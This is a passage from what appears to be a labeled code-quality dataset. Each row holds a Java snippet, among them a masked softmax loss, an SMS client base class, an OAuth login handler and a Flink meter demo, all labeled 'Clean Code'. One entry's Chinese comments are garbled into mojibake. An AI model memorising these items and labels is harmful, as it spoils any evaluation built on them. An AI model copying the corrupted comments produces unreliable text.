  public static final String USER_UPLOAD_IMAGE_SCENE_AVATAR=""avatar"";
  public static final String DIR_AVATAR=""user/avatar/"";
}",0,Clean Code
"/** 
 * {@code MaskedSoftmaxCrossEntropyLoss} is an implementation of {@link Loss} that only considers aspecific number of values for the loss computations, and masks the rest according to the given sequence.
 */
public class MaskedSoftmaxCrossEntropyLoss extends Loss {
  private float weight;
  private int classAxis;
  private boolean sparseLabel;
  private boolean fromLogit;
  /** 
 * Creates a new instance of  {@code SoftmaxCrossEntropyLoss} with default parameters. 
 */
  public MaskedSoftmaxCrossEntropyLoss(){
    this(""MaskedSoftmaxCrossEntropyLoss"");
  }
  /** 
 * Creates a new instance of  {@code SoftmaxCrossEntropyLoss} with default parameters.
 * @param name the name of the loss
 */
  public MaskedSoftmaxCrossEntropyLoss(  String name){
    this(name,1,-1,true,false);
  }
  /** 
 * Creates a new instance of  {@code MaskedSoftmaxCrossEntropyLoss} with the given parameters.
 * @param name the name of the loss
 * @param weight the weight to apply on the loss value, default 1
 * @param classAxis the axis that represents the class probabilities, default -1
 * @param sparseLabel whether labels are 1-D integer array of [batch_size] (false) or 2-Dprobabilities of [batch_size, n-class] (true), default true
 * @param fromLogit if true, the inputs are assumed to be the numbers before being applied withsoftmax. Then logSoftmax will be applied to input, default false
 */
  public MaskedSoftmaxCrossEntropyLoss(  String name,  float weight,  int classAxis,  boolean sparseLabel,  boolean fromLogit){
    super(name);
    this.weight=weight;
    this.classAxis=classAxis;
    this.sparseLabel=sparseLabel;
    this.fromLogit=fromLogit;
  }
  /** 
 * Calculates the evaluation between the labels and the predictions. The  {@code label} parameteris an  {@link NDList} that contains the label and the mask sequence in that order.
 * @param labels the {@link NDList} that contains correct values and the mask sequence
 * @param predictions the predicted values
 * @return the evaluation result
 */
  @Override public NDArray evaluate(  NDList labels,  NDList predictions){
    NDArray weights=labels.head().onesLike().expandDims(-1).sequenceMask(labels.get(1));
    NDArray pred=predictions.singletonOrThrow();
    if (!fromLogit) {
      pred=pred.logSoftmax(classAxis);
    }
    NDArray loss;
    NDArray lab=labels.head();
    if (sparseLabel) {
      NDIndex pickIndex=new NDIndex().addAllDim(Math.floorMod(classAxis,pred.getShape().dimension())).addPickDim(lab);
      loss=pred.get(pickIndex).neg();
    }
 else {
      lab=lab.reshape(pred.getShape());
      loss=pred.mul(lab).neg().sum(new int[]{classAxis},true);
    }
    loss=loss.mul(weights);
    if (weight != 1) {
      loss=loss.mul(weight);
    }
    return loss.mean(new int[]{1});
  }
}
",0,Clean Code
"/** 
 * 短信客户端的抽象类，提供模板方法，减少子类的冗余代码
 * @author zzf
 * @since 2021/2/1 9:28
 */
@Slf4j public abstract class AbstractSmsClient implements SmsClient {
  /** 
 * 短信渠道配置
 */
  protected volatile SmsChannelProperties properties;
  public AbstractSmsClient(  SmsChannelProperties properties){
    this.properties=properties;
  }
  /** 
 * 初始化
 */
  public final void init(){
    log.debug(""[init][配置({}) 初始化完成]"",properties);
  }
  public final void refresh(  SmsChannelProperties properties){
    if (properties.equals(this.properties)) {
      return;
    }
    log.info(""[refresh][配置({})发生变化，重新初始化]"",properties);
    this.properties=properties;
    this.init();
  }
  @Override public Long getId(){
    return properties.getId();
  }
}
",0,Clean Code
"/** 
 * 甯搁噺
 * @author zwmagic
 * @since 2024-02-02
 */
public class Constants {
  /** 
 * 榛樿缂栫爜
 */
  public static final String DEFAULT_ENCODE=""UTF-8"";
  /** 
 * 鎸囩ずHTTP娑堟伅浣撶殑MIME绫诲瀷鍜岀紪鐮佹牸寮忕殑澶撮儴瀛楁鍚�
 */
  public static final String CONTENT_TYPE=""Content-Type"";
  /** 
 * 鎸囩ずHTTP娑堟伅浣撶殑澶у皬锛屼互瀛楄妭涓哄崟浣嶇殑澶撮儴瀛楁鍚�
 */
  public static final String CONTENT_LENGTH=""Content-Length"";
  /** 
 * HTTP璺緞鍒嗛殧绗�
 */
  public static final String HTTP_PATH_DIVIDER=""/"";
  /** 
 * 绉佹湁鏋勯�犳柟娉曪紝闃叉澶栭儴瀹炰緥鍖�
 */
  private Constants(){
  }
}",0,Clean Code
"public class SearchAndPickUserFragment extends Fragment implements UserListAdapter.OnUserClickListener {
  private CheckableUserListAdapter contactAdapter;
  private PickUserViewModel pickUserViewModel;
  private PickUserFragment pickUserFragment;
  RecyclerView contactRecyclerView;
  TextView tipTextView;
  @Nullable @Override public View onCreateView(  @NonNull LayoutInflater inflater,  @Nullable ViewGroup container,  @Nullable Bundle savedInstanceState){
    View view=inflater.inflate(R.layout.contact_search_fragment,container,false);
    bindViews(view);
    bindEvents(view);
    init();
    return view;
  }
  private void bindEvents(  View view){
    view.findViewById(R.id.tipTextView).setOnClickListener(_v -> onTipTextViewClick());
  }
  private void bindViews(  View view){
    contactRecyclerView=view.findViewById(R.id.usersRecyclerView);
    tipTextView=view.findViewById(R.id.tipTextView);
  }
  public void setPickUserFragment(  PickUserFragment pickUserFragment){
    this.pickUserFragment=pickUserFragment;
  }
  void onTipTextViewClick(){
    pickUserFragment.hideSearchContactFragment();
  }
  private void init(){
    pickUserViewModel=ViewModelProviders.of(getActivity()).get(PickUserViewModel.class);
    contactAdapter=new CheckableUserListAdapter(this);
    contactAdapter.setOnUserClickListener(this);
    contactRecyclerView.setLayoutManager(new LinearLayoutManager(getActivity()));
    contactRecyclerView.setAdapter(contactAdapter);
  }
  public void search(  String keyword){
    if (TextUtils.isEmpty(keyword)) {
      return;
    }
    List<UIUserInfo> result=pickUserViewModel.searchUser(keyword);
    if (result == null || result.isEmpty()) {
      contactRecyclerView.setVisibility(View.GONE);
      tipTextView.setVisibility(View.VISIBLE);
    }
 else {
      contactRecyclerView.setVisibility(View.VISIBLE);
      tipTextView.setVisibility(View.GONE);
    }
    contactAdapter.setUsers(result);
    contactAdapter.notifyDataSetChanged();
  }
  public void rest(){
    tipTextView.setVisibility(View.VISIBLE);
    contactRecyclerView.setVisibility(View.GONE);
    contactAdapter.setUsers(null);
  }
  @Override public void onUserClick(  UIUserInfo userInfo){
    if (userInfo.isCheckable()) {
      pickUserViewModel.checkUser(userInfo,!userInfo.isChecked());
      contactAdapter.updateUserStatus(userInfo);
    }
  }
}
",0,Clean Code
"/** 
 * @author zhenyu.nie created on 2019 2019/5/16 15:53
 */
public class DefaultRequestEncryption implements RequestEncryption {
  private static final TypeReference<Map<String,Object>> mapReference=new TypeReference<Map<String,Object>>(){
  }
;
  private static final TypeReference<RequestData<String>> inputType=new TypeReference<RequestData<String>>(){
  }
;
  private static final String KEY_INDEX=""0"";
  private static final String DATA_INDEX=""1"";
  private final RSAEncryption rsa;
  public DefaultRequestEncryption(  RSAEncryption rsa){
    this.rsa=rsa;
  }
  @Override public RequestData<String> decrypt(  String in) throws IOException {
    Map<String,Object> map=JacksonSerializer.deSerialize(in,mapReference);
    String rsaData=(String)map.get(KEY_INDEX);
    String data=(String)map.get(DATA_INDEX);
    String desKey=rsa.decrypt(rsaData);
    String requestStr=EncryptionUtils.decryptDes(data,desKey);
    return JacksonSerializer.deSerialize(requestStr,inputType);
  }
  @Override public String encrypt(  RequestData<String> requestData,  final String key) throws IOException {
    Map<String,String> map=new HashMap<>();
    String encrypt=rsa.encrypt(key);
    map.put(KEY_INDEX,encrypt);
    String encryptDes=EncryptionUtils.encryptDes(JacksonSerializer.serialize(requestData),key);
    map.put(DATA_INDEX,encryptDes);
    return JacksonSerializer.serialize(map);
  }
}
",0,Clean Code
"public final class PPath {
  private final Runnable onComplete;
  private final List<PNode> nodes=new ArrayList<>();
  private final double pathVariance;
  private final double maxDistance;
  private int index=0;
  private final AtomicReference<State> state=new AtomicReference<>(State.CALCULATING);
  public Point getNext(){
    if (index + 1 >= nodes.size())     return null;
    var current=nodes.get(index + 1);
    return new Vec(current.x(),current.y(),current.z());
  }
  public void setState(  @NotNull PPath.State newState){
    state.set(newState);
  }
  public enum State {  CALCULATING,   FOLLOWING,   TERMINATING,   TERMINATED,   COMPUTED,   BEST_EFFORT,   INVALID}
  @NotNull State getState(){
    return state.get();
  }
  public @NotNull List<PNode> getNodes(){
    return nodes;
  }
  public PPath(  double maxDistance,  double pathVariance,  Runnable onComplete){
    this.onComplete=onComplete;
    this.maxDistance=maxDistance;
    this.pathVariance=pathVariance;
  }
  void runComplete(){
    if (onComplete != null)     onComplete.run();
  }
  @Override public @NotNull String toString(){
    return nodes.toString();
  }
  @Nullable PNode.Type getCurrentType(){
    if (index >= nodes.size())     return null;
    var current=nodes.get(index);
    return current.getType();
  }
  @Nullable Point getCurrent(){
    if (index >= nodes.size())     return null;
    var current=nodes.get(index);
    return new Vec(current.x(),current.y(),current.z());
  }
  void next(){
    if (index >= nodes.size())     return;
    index++;
  }
  double maxDistance(){
    return maxDistance;
  }
  double pathVariance(){
    return pathVariance;
  }
}
",0,Clean Code
"public interface VariableService extends IService<Variable> {
  /** 
 * Find variables based on the given variable and query request.
 * @param variable The variable to search for.
 * @param restRequest The query request containing search filters and pagination options.
 * @return An IPage object containing the found Variable objects matching the search criteria.
 */
  IPage<Variable> getPage(  Variable variable,  RestRequest restRequest);
  /** 
 * Retrieves a list of variables based on the team ID.
 * @param teamId The ID of the team to filter the variables by.
 * @return A list of variables that belong to the specified team.
 */
  List<Variable> listByTeamId(  Long teamId);
  /** 
 * Retrieve a list of variables based on the team ID and search keywords.
 * @param teamId The ID of the team for which to retrieve the variables.
 * @param keyword The fuzzy search keywords used to filter the variables. This parameter isnullable.
 * @return A List of Variable objects that match the specified team ID and search keywords.
 */
  List<Variable> listByTeamId(  Long teamId,  String keyword);
  /** 
 * Check if a team exists by teamId.
 * @param teamId the id of the team to check.
 * @return true if a team exists with the given teamId, false otherwise.
 */
  boolean existsByTeamId(  Long teamId);
  /** 
 * Create a variable.
 * @param variable The variable to be created.
 */
  void createVariable(  Variable variable);
  /** 
 * Deletes a Variable.
 * @param variable the Variable object to be deleted
 */
  void remove(  Variable variable);
  /** 
 * Find a Variable by its code and team ID.
 * @param teamId The ID of the team to search within.
 * @param variableCode The code of the variable to find.
 * @return The Variable found, or null if no match is found.
 */
  Variable findByVariableCode(  Long teamId,  String variableCode);
  /** 
 * Replaces a specified variable in the given string with the corresponding variable value.
 * @param teamId The identifier of the team.
 * @param mixed The string that may contain variables to be replaced.
 * @return The modified string after replacing the variables.
 */
  String replaceVariable(  Long teamId,  String mixed);
  /** 
 * Retrieves a page of dependent applications based on the given variable and request.
 * @param variable The variable to use for retrieving dependent applications.
 * @param request The REST request containing additional parameters for retrieving the page.
 * @return An instance of IPage<Application> containing the dependent applications.
 */
  IPage<FlinkApplication> getDependAppsPage(  Variable variable,  RestRequest request);
  /** 
 * Updates the given variable.
 * @param variable the variable to be updated
 */
  void updateVariable(  Variable variable);
}
",0,Clean Code
"@Route(APIPath.Robot_Group_Member_Add) @HttpMethod(""POST"") public class AddGroupMemberAction extends RobotAction {
  @Override public boolean isTransactionAction(){
    return true;
  }
  @Override public boolean action(  Request request,  Response response){
    if (request.getNettyRequest() instanceof FullHttpRequest) {
      InputAddGroupMember inputAddGroupMember=getRequestBody(request.getNettyRequest(),InputAddGroupMember.class);
      inputAddGroupMember.setOperator(robot.getUid());
      if (inputAddGroupMember.isValide()) {
        sendApiRequest(response,IMTopic.AddGroupMemberTopic,inputAddGroupMember.toProtoGroupRequest().toByteArray(),result -> {
          ByteBuf byteBuf=Unpooled.buffer();
          byteBuf.writeBytes(result);
          ErrorCode errorCode=ErrorCode.fromCode(byteBuf.readByte());
          if (errorCode == ErrorCode.ERROR_CODE_SUCCESS) {
            sendResponse(response,null,null);
          }
 else {
            sendResponse(response,errorCode,null);
          }
        }
);
        return false;
      }
 else {
        setResponseContent(RestResult.resultOf(ErrorCode.INVALID_PARAMETER),response);
      }
    }
    return true;
  }
}
",0,Clean Code
"/** 
 * Exception for faults when the fault doesn't return a java exception. This exception is required for MicroHessianInput.
 */
public class MessageServiceException extends IOException {
  private Throwable _rootCause;
  /** 
 * Zero-arg constructor.
 */
  public MessageServiceException(){
  }
  /** 
 * Create the exception.
 */
  public MessageServiceException(  String message){
    super(message);
  }
  /** 
 * Create the exception.
 */
  public MessageServiceException(  String message,  Throwable rootCause){
    super(message);
    _rootCause=rootCause;
  }
  /** 
 * Create the exception.
 */
  public MessageServiceException(  Throwable rootCause){
    super(String.valueOf(rootCause));
    _rootCause=rootCause;
  }
  /** 
 * Returns the underlying cause.
 */
  public Throwable getRootCause(){
    return getCause();
  }
  /** 
 * Returns the underlying cause.
 */
  public Throwable getCause(){
    return _rootCause;
  }
}
",0,Clean Code
"/** 
 * @author lengleng
 * @date 2022-06-02
 */
@Slf4j public class PigAuthenticationSuccessEventHandler implements AuthenticationSuccessHandler {
  private final HttpMessageConverter<OAuth2AccessTokenResponse> accessTokenHttpResponseConverter=new PigCustomOAuth2AccessTokenResponseHttpMessageConverter();
  /** 
 * Called when a user has been successfully authenticated.
 * @param request the request which caused the successful authentication
 * @param response the response
 * @param authentication the <tt>Authentication</tt> object which was created duringthe authentication process.
 */
  @SneakyThrows @Override public void onAuthenticationSuccess(  HttpServletRequest request,  HttpServletResponse response,  Authentication authentication){
    OAuth2AccessTokenAuthenticationToken accessTokenAuthentication=(OAuth2AccessTokenAuthenticationToken)authentication;
    Map<String,Object> map=accessTokenAuthentication.getAdditionalParameters();
    if (MapUtil.isNotEmpty(map)) {
      PigUser userInfo=(PigUser)map.get(SecurityConstants.DETAILS_USER);
      log.info(""用户：{} 登录成功"",userInfo.getName());
      SecurityContextHolder.getContext().setAuthentication(accessTokenAuthentication);
      SysLog logVo=SysLogUtils.getSysLog();
      logVo.setTitle(""登录成功"");
      String startTimeStr=request.getHeader(CommonConstants.REQUEST_START_TIME);
      if (StrUtil.isNotBlank(startTimeStr)) {
        Long startTime=Long.parseLong(startTimeStr);
        Long endTime=System.currentTimeMillis();
        logVo.setTime(endTime - startTime);
      }
      logVo.setCreateBy(userInfo.getName());
      SpringContextHolder.publishEvent(new SysLogEvent(logVo));
    }
    sendAccessTokenResponse(request,response,authentication);
  }
  private void sendAccessTokenResponse(  HttpServletRequest request,  HttpServletResponse response,  Authentication authentication) throws IOException {
    OAuth2AccessTokenAuthenticationToken accessTokenAuthentication=(OAuth2AccessTokenAuthenticationToken)authentication;
    OAuth2AccessToken accessToken=accessTokenAuthentication.getAccessToken();
    OAuth2RefreshToken refreshToken=accessTokenAuthentication.getRefreshToken();
    Map<String,Object> additionalParameters=accessTokenAuthentication.getAdditionalParameters();
    OAuth2AccessTokenResponse.Builder builder=OAuth2AccessTokenResponse.withToken(accessToken.getTokenValue()).tokenType(accessToken.getTokenType()).scopes(accessToken.getScopes());
    if (accessToken.getIssuedAt() != null && accessToken.getExpiresAt() != null) {
      builder.expiresIn(ChronoUnit.SECONDS.between(accessToken.getIssuedAt(),accessToken.getExpiresAt()));
    }
    if (refreshToken != null) {
      builder.refreshToken(refreshToken.getTokenValue());
    }
    if (!CollectionUtils.isEmpty(additionalParameters)) {
      builder.additionalParameters(additionalParameters);
    }
    OAuth2AccessTokenResponse accessTokenResponse=builder.build();
    ServletServerHttpResponse httpResponse=new ServletServerHttpResponse(response);
    SecurityContextHolder.clearContext();
    this.accessTokenHttpResponseConverter.write(accessTokenResponse,null,httpResponse);
  }
}
",0,Clean Code
"/** 
 * Desc: custom Meter Created by zhisheng on 2019-11-16 19:08 blog：http://www.54tianzhisheng.cn/ 微信公众号：zhisheng
 */
public class CustomMeterMetrics {
  public static void main(  String[] args) throws Exception {
    StreamExecutionEnvironment env=StreamExecutionEnvironment.getExecutionEnvironment();
    env.getConfig().setGlobalJobParameters(ParameterTool.fromArgs(args));
    env.addSource(new SourceFunction<String>(){
      private volatile boolean isRunning=true;
      @Override public void run(      SourceContext<String> out) throws Exception {
        while (isRunning) {
          out.collect(String.valueOf(Math.round(Math.random() * 100)));
          Thread.sleep(1000);
        }
      }
      @Override public void cancel(){
        isRunning=false;
      }
    }
).map(new RichMapFunction<String,String>(){
      Meter meter;
      int index;
      @Override public void open(      Configuration parameters) throws Exception {
        super.open(parameters);
        com.codahale.metrics.Meter dropwizardMeter=new com.codahale.metrics.Meter();
        index=getRuntimeContext().getIndexOfThisSubtask() + 1;
        meter=getRuntimeContext().getMetricGroup().addGroup(""flink-metrics-test"").meter(""meterTest"",new DropwizardMeterWrapper(dropwizardMeter));
      }
      @Override public String map(      String s) throws Exception {
        meter.markEvent();
        System.out.println(""index = "" + index + "" rate = ""+ meter.getRate()+ "" count = ""+ meter.getCount());
        return s;
      }
    }
).print();
    env.execute(""Flink custom Meter Metrics"");
  }
}
",0,Clean Code
"/** 
 * Get netty channel.
 * @author jiachun.fjc
 */
public class NettyConnectionHelper {
  private static final ReferenceFieldUpdater<NettyServerStream,WriteQueue> WRITE_QUEUE_GETTER=Updaters.newReferenceFieldUpdater(NettyServerStream.class,""writeQueue"");
  private static final ReferenceFieldUpdater<WriteQueue,Channel> CHANNEL_GETTER=Updaters.newReferenceFieldUpdater(WriteQueue.class,""channel"");
  private static final AttributeKey<NettyConnection> NETTY_CONN_KEY=AttributeKey.valueOf(""netty.conn"");
  public static Connection getOrCreateConnection(  final ServerStream stream,  final List<ConnectionClosedEventListener> listeners){
    if (stream instanceof NettyServerStream) {
      return attachChannel(CHANNEL_GETTER.get(WRITE_QUEUE_GETTER.get((NettyServerStream)stream)),listeners);
    }
    return null;
  }
  private static Connection attachChannel(  final Channel channel,  final List<ConnectionClosedEventListener> listeners){
    if (channel == null) {
      return null;
    }
    final Attribute<NettyConnection> attr=channel.attr(NETTY_CONN_KEY);
    NettyConnection conn=attr.get();
    if (conn == null) {
      final NettyConnection newConn=new NettyConnection(channel);
      conn=attr.setIfAbsent(newConn);
      if (conn == null) {
        conn=newConn;
        for (        final ConnectionClosedEventListener l : listeners) {
          conn.addClosedEventListener(l);
        }
      }
    }
    return conn;
  }
}
",0,Clean Code
"public class DSSCommonUtils {
  public static final String FLOW_RESOURCE_NAME=""resources"";
  public static final String FLOW_EDGES_NAME=""edges"";
  public static final String FLOW_PARENT_NAME=""parent"";
  public static final String NODE_RESOURCE_NAME=""resources"";
  public static final String FLOW_NODE_NAME=""nodes"";
  public static final String FLOW_PROP_NAME=""props"";
  public static final String NODE_PROP_NAME=""params"";
  public static final String NODE_ID_NAME=""id"";
  public static final String NODE_NAME_NAME=""title"";
  public static final Gson COMMON_GSON=new GsonBuilder().disableHtmlEscaping().setDateFormat(""yyyy-MM-dd'T'HH:mm:ssZ"").serializeNulls().registerTypeAdapter(Double.class,(JsonSerializer<Double>)(t,type,jsonSerializationContext) -> {
    if (t == t.longValue()) {
      return new JsonPrimitive(t.longValue());
    }
 else {
      return new JsonPrimitive(t);
    }
  }
).registerTypeAdapter(Date.class,(JsonDeserializer<Date>)(json,typeOfT,context) -> new Date(json.getAsLong())).create();
  public static final ObjectMapper JACKSON=JsonUtils.jackson();
  public static final String ENV_LABEL_VALUE_DEV=""dev"";
  public static final String DSS_LABELS_KEY=""labels"";
  public static final String DSS_EXECUTE_BY_PROXY_USER_KEY=""execByProxyUser"";
  public static final CommonVars<String> DSS_HOME=CommonVars.apply(""DSS_HOME"","""");
  public static long parseToLong(  Object val){
    if (val instanceof Double) {
      return ((Double)val).longValue();
    }
 else     if (val instanceof Integer) {
      return new Double((Integer)val).longValue();
    }
 else     if (val instanceof Long) {
      return (Long)val;
    }
 else     if (val != null) {
      return Long.parseLong(val.toString());
    }
    throw new DSSRuntimeException(90322,""parse the return of externalSystem failed, the value is null."");
  }
  public static List<DSSNodeDefault> getWorkFlowNodes(  String workFlowJson){
    JsonParser parser=new JsonParser();
    JsonObject jsonObject=parser.parse(workFlowJson).getAsJsonObject();
    JsonArray nodeJsonArray=jsonObject.getAsJsonArray(""nodes"");
    List<DSSNodeDefault> dwsNodes=DSSCommonUtils.COMMON_GSON.fromJson(nodeJsonArray,new TypeToken<List<DSSNodeDefault>>(){
    }
.getType());
    return dwsNodes;
  }
  public static List<String> getWorkFlowNodesJson(  String workFlowJson){
    JsonParser parser=new JsonParser();
    JsonObject jsonObject=parser.parse(workFlowJson).getAsJsonObject();
    JsonArray nodeJsonArray=jsonObject.getAsJsonArray(""nodes"");
    if (nodeJsonArray == null) {
      return null;
    }
    List<Object> nodeJsonList=DSSCommonUtils.COMMON_GSON.fromJson(nodeJsonArray.toString(),new TypeToken<List<Object>>(){
    }
.getType());
    return nodeJsonList.stream().map(DSSCommonUtils.COMMON_GSON::toJson).collect(Collectors.toList());
  }
}
",0,Clean Code
"abstract class AbstractWorkerTriggerCallable extends AbstractWorkerCallable {
  private static final Duration AWAIT_ON_KILL=Duration.ofMillis(50);
  @Getter WorkerTrigger workerTrigger;
  AbstractWorkerTriggerCallable(  RunContext runContext,  String type,  WorkerTrigger workerTrigger){
    super(runContext,type,workerTrigger.uid(),workerTrigger.getTrigger().getClass().getClassLoader());
    this.workerTrigger=workerTrigger;
  }
  @Override public void signalStop(){
    try {
      ((WorkerTriggerInterface)workerTrigger.getTrigger()).stop();
    }
 catch (    Exception e) {
      logger.warn(""Error while stopping trigger: '{}'"",getType(),e);
    }
  }
  @Override protected void kill(  final boolean markAsKilled){
    try {
      ((WorkerTriggerInterface)workerTrigger.getTrigger()).kill();
      if (markAsKilled) {
        awaitStop(AWAIT_ON_KILL);
      }
    }
 catch (    Exception e) {
      logger.warn(""Error while killing trigger: '{}'"",getType(),e);
    }
 finally {
      super.kill(markAsKilled);
    }
  }
}
",0,Clean Code
"/** 
 * 将每行数据按照指定分隔符进行拆分
 */
public class SplitBolt extends BaseRichBolt {
  private OutputCollector collector;
  @Override public void prepare(  Map stormConf,  TopologyContext context,  OutputCollector collector){
    this.collector=collector;
  }
  @Override public void execute(  Tuple input){
    String line=input.getStringByField(""line"");
    String[] words=line.split(""\t"");
    for (    String word : words) {
      collector.emit(new Values(word,String.valueOf(1)));
    }
  }
  @Override public void declareOutputFields(  OutputFieldsDeclarer declarer){
    declarer.declare(new Fields(""word"",""count""));
  }
}
/** 
 * 将每行数据按照指定分隔符进行拆分
 */
public class SplitBolt extends BaseRichBolt {
  private OutputCollector collector;
  @Override public void prepare(  Map stormConf,  TopologyContext context,  OutputCollector collector){
    this.collector=collector;
  }
  @Override public void execute(  Tuple input){
    String line=input.getStringByField(""line"");
    String[] words=line.split(""\t"");
    for (    String word : words) {
      collector.emit(tuple(word,1));
    }
  }
  @Override public void declareOutputFields(  OutputFieldsDeclarer declarer){
    declarer.declare(new Fields(""word"",""count""));
  }
}
",0,Clean Code
"/** 
 * Visitor interface for this (outer) class. 
 */
public interface Visitor {
  /** 
 * Visits a  {@link PlainInsn}.
 * @param insn {@code non-null;} the instruction to visit
 */
  void visitPlainInsn(  PlainInsn insn);
  /** 
 * Visits a  {@link PlainCstInsn}.
 * @param insn {@code non-null;} the instruction to visit
 */
  void visitPlainCstInsn(  PlainCstInsn insn);
  /** 
 * Visits a  {@link SwitchInsn}.
 * @param insn {@code non-null;} the instruction to visit
 */
  void visitSwitchInsn(  SwitchInsn insn);
  /** 
 * Visits a  {@link ThrowingCstInsn}.
 * @param insn {@code non-null;} the instruction to visit
 */
  void visitThrowingCstInsn(  ThrowingCstInsn insn);
  /** 
 * Visits a  {@link ThrowingInsn}.
 * @param insn {@code non-null;} the instruction to visit
 */
  void visitThrowingInsn(  ThrowingInsn insn);
  /** 
 * Visits a  {@link FillArrayDataInsn}.
 * @param insn {@code non-null;} the instruction to visit
 */
  void visitFillArrayDataInsn(  FillArrayDataInsn insn);
  /** 
 * Visits a  {@link InvokePolymorphicInsn}.
 * @param insn {@code non-null;} the instruction to visit
 */
  void visitInvokePolymorphicInsn(  InvokePolymorphicInsn insn);
}
/** 
 * BasicBlock visitor interface 
 */
public interface Visitor {
  /** 
 * Visits a basic block
 * @param b block visited
 */
  void visitBlock(  BasicBlock b);
}
",0,Clean Code
"/** 
 * @hide 
 */
@SuppressWarnings(""JniMissingFunction"") public final class ZygoteService extends BaseService {
  @Override public native boolean checkFileAccess(  String filename,  int mode);
  @Override public native FileResult statFile(  String filename) throws IOException ;
  @Override public native byte[] readFile(  String filename) throws IOException ;
  @Override public FileResult readFile(  String filename,  long previousSize,  long previousTime) throws IOException {
    FileResult stat=statFile(filename);
    if (previousSize == stat.size && previousTime == stat.mtime)     return stat;
    return new FileResult(readFile(filename),stat.size,stat.mtime);
  }
  @Override public FileResult readFile(  String filename,  int offset,  int length,  long previousSize,  long previousTime) throws IOException {
    FileResult stat=statFile(filename);
    if (previousSize == stat.size && previousTime == stat.mtime)     return stat;
    if (offset <= 0 && length <= 0)     return new FileResult(readFile(filename),stat.size,stat.mtime);
    if (offset > 0 && offset >= stat.size) {
      throw new IllegalArgumentException(""offset "" + offset + "" >= size ""+ stat.size+ "" for ""+ filename);
    }
 else     if (offset < 0) {
      offset=0;
    }
    if (length > 0 && (offset + length) > stat.size) {
      throw new IllegalArgumentException(""offset "" + offset + "" + length ""+ length+ "" > size ""+ stat.size+ "" for ""+ filename);
    }
 else     if (length <= 0) {
      length=(int)(stat.size - offset);
    }
    byte[] content=readFile(filename);
    return new FileResult(Arrays.copyOfRange(content,offset,offset + length),stat.size,stat.mtime);
  }
}
",0,Clean Code
"public class TreeItemCache {
  private static final Map<String,PathTrie<TreeItem<ZkNode>>> CACHE=new ConcurrentHashMap<>();
  private static final TreeItemCache INSTANCE=new TreeItemCache();
  private TreeItemCache(){
  }
  public static TreeItemCache getInstance(){
    return INSTANCE;
  }
  public boolean exists(  String serverId){
    return CACHE.containsKey(serverId);
  }
  public boolean hasNode(  String serverId,  String path){
    return exists(serverId) && get(serverId,path) != null;
  }
  public void add(  String server,  String path,  TreeItem<ZkNode> item){
    var pathTrie=CACHE.computeIfAbsent(server,key -> new PathTrie<>());
    pathTrie.add(path,item);
  }
  public List<TreeItem<ZkNode>> search(  String id,  String node){
    if (id == null || !this.exists(id)) {
      return Collections.emptyList();
    }
    return CACHE.get(id).search(node);
  }
  public TreeItem<ZkNode> get(  String serverId,  String path){
    return CACHE.get(serverId).getByPath(path);
  }
  public void remove(  String serverId,  String path){
    CACHE.get(serverId).remove(path);
  }
  public void remove(  String serverId){
    CACHE.remove(serverId);
  }
}
",0,Clean Code
"/** 
 * @author hzh
 */
public final class ZipStrategyManager {
  private static ZipStrategy[] zipStrategies=new ZipStrategy[5];
  private static byte DEFAULT_STRATEGY=1;
  public static final byte JDK_STRATEGY=1;
  public static final byte PARALLEL_STRATEGY=2;
static {
    addZipStrategy(JDK_STRATEGY,new JDKZipStrategy());
  }
  public static void addZipStrategy(  final int idx,  final ZipStrategy zipStrategy){
    if (zipStrategies.length <= idx) {
      final ZipStrategy[] newZipStrategies=new ZipStrategy[idx + 5];
      System.arraycopy(zipStrategies,0,newZipStrategies,0,zipStrategies.length);
      zipStrategies=newZipStrategies;
    }
    zipStrategies[idx]=zipStrategy;
  }
  public static ZipStrategy getZipStrategy(  final int idx){
    return zipStrategies[idx];
  }
  public static ZipStrategy getDefault(){
    return zipStrategies[DEFAULT_STRATEGY];
  }
  public static void init(  final RheaKVStoreOptions opts){
    if (opts.isUseParallelCompress()) {
      if (zipStrategies[PARALLEL_STRATEGY] == null) {
        final ZipStrategy zipStrategy=new ParallelZipStrategy(opts.getCompressThreads(),opts.getDeCompressThreads());
        ZipStrategyManager.addZipStrategy(ZipStrategyManager.PARALLEL_STRATEGY,zipStrategy);
        DEFAULT_STRATEGY=PARALLEL_STRATEGY;
      }
    }
    if (DEFAULT_STRATEGY == JDK_STRATEGY && opts.getCompressLevel() > Deflater.DEFAULT_COMPRESSION && opts.getCompressLevel() <= Deflater.BEST_COMPRESSION) {
      addZipStrategy(JDK_STRATEGY,new JDKZipStrategy(opts.getCompressLevel()));
    }
  }
  private ZipStrategyManager(){
  }
}",0,Clean Code
"/** 
 * Jackson 枚举反序列化器
 * @author zhaojun
 */
@Slf4j @Setter @JsonComponent public class JacksonEnumDeserializer extends JsonDeserializer<Enum<?>> implements ContextualDeserializer {
  private Class<?> clazz;
  /** 
 * 反序列化操作
 * @param jsonParser json 解析器
 * @param ctx 反序列化上下文
 * @return  反序列化后的枚举值
 * @throws IOException  反序列化异常
 */
  @Override public Enum<?> deserialize(  JsonParser jsonParser,  DeserializationContext ctx) throws IOException {
    Class<?> enumType=clazz;
    if (Objects.isNull(enumType) || !enumType.isEnum()) {
      return null;
    }
    String text=jsonParser.getText();
    Method method=StringToEnumConverterFactory.getMethod(clazz);
    Enum<?>[] enumConstants=(Enum<?>[])enumType.getEnumConstants();
    for (    Enum<?> e : enumConstants) {
      try {
        if (Objects.equals(method.invoke(e).toString(),text)) {
          return e;
        }
      }
 catch (      IllegalAccessException|InvocationTargetException ex) {
        log.error(""获取枚举值错误!!! "",ex);
      }
    }
    return null;
  }
  /** 
 * 为不同的枚举获取合适的解析器
 * @param ctx 反序列化上下文
 * @param property property
 */
  @Override public JsonDeserializer<Enum<?>> createContextual(  DeserializationContext ctx,  BeanProperty property){
    Class<?> rawCls=ctx.getContextualType().getRawClass();
    JacksonEnumDeserializer converter=new JacksonEnumDeserializer();
    converter.setClazz(rawCls);
    return converter;
  }
}
",0,Clean Code
"/** 
 * Github登录
 * @author yadong.zhang (yadong.zhang0415(a)gmail.com)
 * @since 1.0.0
 */
public class AuthGithubRequest extends AuthDefaultRequest {
  public AuthGithubRequest(  AuthConfig config){
    super(config,AuthDefaultSource.GITHUB);
  }
  public AuthGithubRequest(  AuthConfig config,  AuthStateCache authStateCache){
    super(config,AuthDefaultSource.GITHUB,authStateCache);
  }
  @Override public AuthToken getAccessToken(  AuthCallback authCallback){
    String response=doPostAuthorizationCode(authCallback.getCode());
    Map<String,String> res=GlobalAuthUtils.parseStringToMap(response);
